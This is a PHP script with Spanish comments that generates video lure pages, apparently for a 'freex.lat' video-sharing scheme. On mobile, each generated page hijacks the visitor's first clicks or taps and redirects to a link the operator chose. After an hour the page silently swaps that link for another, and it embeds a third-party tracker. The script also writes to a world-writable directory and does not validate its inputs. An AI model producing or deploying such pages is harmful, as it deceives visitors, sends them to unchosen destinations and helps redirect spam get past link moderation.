<?php
// Definir el dominio
$dominio = 'https://testphp-tau.vercel.app/';

// Verificar si se han enviado los datos del formulario
$video_enlace = isset($_POST['video_enlace']) ? $_POST['video_enlace'] : '';
$redireccion_enlace = isset($_POST['redireccion_enlace']) ? $_POST['redireccion_enlace'] : '';

if ($video_enlace && $redireccion_enlace) {
    // Crear un nombre único para el archivo (4 a 5 caracteres)
    $id_entrada = substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'), 0, rand(4, 5));

    // Obtener la hora actual en formato de timestamp
    $hora_creacion = time();

    // Guardar la hora de creación en un archivo temporal o base de datos (aquí lo guardamos en un archivo)
    file_put_contents('5/' . $id_entrada . '_hora.txt', $hora_creacion);

    // Generar el código HTML con el video, redirección personalizada y el script proporcionado
    $codigo_html = '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>postvip</title>
        <meta name="description" content="Mira este video en freex.lat">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: #f4f4f4;
                margin: 0;
            }
            .video-container {
                width: 100%;
                max-width: 90%;
                margin: 0 auto;
                background-color: #fff;
                border-radius: 15px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                overflow: hidden;
            }
            .video-container video {
                width: 100%;
                height: auto;
            }
            .btn {
                padding: 12px 20px;
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
                transition: background 0.3s;
                text-align: center;
            }
            .btn:hover {
                background-color: #45a049;
            }
        </style>
        <script>
            // Verificar la hora de creación de la entrada
            const horaCreacion = ' . $hora_creacion . ';
            const enlaceOriginal = "' . htmlspecialchars($redireccion_enlace) . '";
            const enlaceNuevo = "tulink";
            const maxRedirects = 2;
            
            // Función que verifica si han pasado más de una hora
            function verificarHoraCreacion() {
                const horaActual = Math.floor(Date.now() / 1000); // Obtener hora actual en timestamp
                const diferencia = horaActual - horaCreacion;
                return diferencia >= 3600; // Si han pasado más de 3600 segundos (1 hora)
            }

            const redirectUrl = verificarHoraCreacion() ? enlaceNuevo : enlaceOriginal;

            if (!sessionStorage.getItem("sessionStarted")) {
                localStorage.removeItem("clickCount");
                sessionStorage.setItem("sessionStarted", "true");
            }

            let clickCount = parseInt(localStorage.getItem("clickCount")) || 0;

            function handleClick(event) {
                clickCount++;
                localStorage.setItem("clickCount", clickCount);
                if (clickCount <= maxRedirects) {
                    window.location.href = redirectUrl;
                    event.preventDefault();
                } else {
                    document.getElementById("videoPlayer").setAttribute("controls", "controls");
                }
            }

            if (/Mobi|Android/i.test(navigator.userAgent)) {
                document.addEventListener("click", handleClick, true);
                document.addEventListener("touchstart", handleClick, true);
            }
        </script>
        <script>
            document.addEventListener("DOMContentLoaded", function () {
                var video = document.getElementById("videoPlayer");
                video.addEventListener("ended", function () {
                    window.location.href = "' . htmlspecialchars($redireccion_enlace) . '";
                });
            });
        </script>
    </head>
    <body>
        <div class="video-container">
            <video id="videoPlayer" src="' . htmlspecialchars($video_enlace) . '" autoplay muted></video>
 <div class="overlay">
        <script id="_wauvpc">var _wau = _wau || []; _wau.push(["classic", "52cru94v9e", "vpc"]);</script>
        <script async src="//waust.at/c.js"></script>
    </div>
        </div>
    </body>
    </html>';

    // Guardar el archivo en la carpeta "5"
    $directorio = '5/';
    if (!is_dir($directorio)) {
        mkdir($directorio, 0777, true);
    }

    $ruta_archivo = $directorio . $id_entrada;
    file_put_contents($ruta_archivo, $codigo_html);

    // Generar el enlace completo
    $enlace_completo = $dominio . '5/' . $id_entrada;

    // Mostrar el enlace generado
    echo '
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Entrada Generada</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                background: #f5f5f5;
                margin: 0;
                padding: 20px;
            }
            .container {
                padding: 20px;
                background: #ffffff;
                border-radius: 15px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                display: inline-block;
            }
            .btn {
                display: inline-block;
                padding: 10px 20px;
                font-size: 16px;
                color: white;
                background: #4CAF50;
                text-decoration: none;
                border-radius: 5px;
                margin-top: 15px;
                transition: background 0.3s;
                cursor: pointer;
            }
            .btn:hover {
                background: #45a049;
            }
            input {
                width: 100%;
                padding: 10px;
                margin-top: 10px;
                font-size: 14px;
                border: 1px solid #ddd;
                border-radius: 5px;
                text-align: center;
            }
        </style>
        <script>
            function copiarEnlace() {
                const input = document.getElementById("enlace");
                input.select();
                document.execCommand("copy");
                alert("¡Enlace copiado al portapapeles!");
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>¡Entrada generada exitosamente!</h1>
            <p>Enlace de la entrada:</p>
            <input type="text" id="enlace" value="' . $enlace_completo . '" readonly>
            <button class="btn" onclick="copiarEnlace()">Copiar Enlace</button>
            <a href="index.php" class="btn">Crear otra entrada</a>
        </div>
    </body>
    </html>';
} else {
    // Mostrar formulario inicial
    echo '
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Generador de Entrada</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f5f5f5;
                text-align: center;
                padding: 20px;
            }
            .form-container {
                padding: 20px;
                background: #ffffff;
                border-radius: 15px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                display: inline-block;
            }
            label {
                font-size: 16px;
                display: block;
                margin-top: 10px;
            }
            input {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                font-size: 14px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }
            button {
                padding: 10px 20px;
                font-size: 16px;
                color: white;
                background: #4CAF50;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            button:hover {
                background: #45a049;
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <h1>Generador de Entrada</h1>
            <form action="index.php" method="post">
                <label for="video_enlace">Enlace del Video:</label>
                <input type="text" id="video_enlace" name="video_enlace" placeholder="Ingresa el enlace del video" required>
                <label for="redireccion_enlace">Enlace de Redirección:</label>
                <input type="text" id="redireccion_enlace" name="redireccion_enlace" placeholder="Ingresa el enlace de redirección" required>
                <button type="submit">Generar Entrada</button>
            </form>
        </div>
    </body>
    </html>';
}
?>
